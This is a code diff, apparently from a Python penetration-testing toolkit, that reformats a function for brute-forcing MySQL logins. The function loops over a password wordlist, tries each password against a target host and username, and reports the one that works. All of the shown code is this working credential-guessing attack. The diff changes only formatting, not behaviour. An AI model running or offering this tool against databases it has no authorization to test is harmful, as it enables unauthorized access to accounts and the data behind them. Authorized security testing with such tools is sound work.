@@ -2,7 +2,10 @@ import pymysql
 from typing import Optional
 from .utils import clear_line
 
-def mysql_bruteforce(host: str, username: str, wordlist_path: str, port: int = 3306) -> Optional[str]:
+
+def mysql_bruteforce(
+    host: str, username: str, wordlist_path: str, port: int = 3306
+) -> Optional[str]:
     """
     Attempt MySQL brute force attack using a password wordlist.
 
@@ -18,7 +21,7 @@ def mysql_bruteforce(host: str, username: str, wordlist_path: str, port: int = 3
     with open(wordlist_path, "r") as f:
         for line in f:
             password = line.strip()
-            
+
             clear_line()
             print(f"[?] Trying password: {password}", end="\r")
             try:
@@ -27,17 +30,20 @@ def mysql_bruteforce(host: str, username: str, wordlist_path: str, port: int = 3
                     user=username,
                     password=password,
                     port=port,
-                    connect_timeout=3
+                    connect_timeout=3,
                 )
                 print(f"[+] MySQL login succeeded: {username}:{password}")
                 conn.close()
                 return password
-            except pymysql.err.OperationalError: 
+            except pymysql.err.OperationalError:
                 clear_line()
                 print(f"[-] MySQL login failed for {username}:{password}", end="\r")
                 continue
             except Exception as e:
                 clear_line()
-                print(f"Connection error or other MYSQL issues: {e}. Continuing...", end="\r")
+                print(
+                    f"Connection error or other MYSQL issues: {e}. Continuing...",
+                    end="\r",
+                )
                 continue
     return None
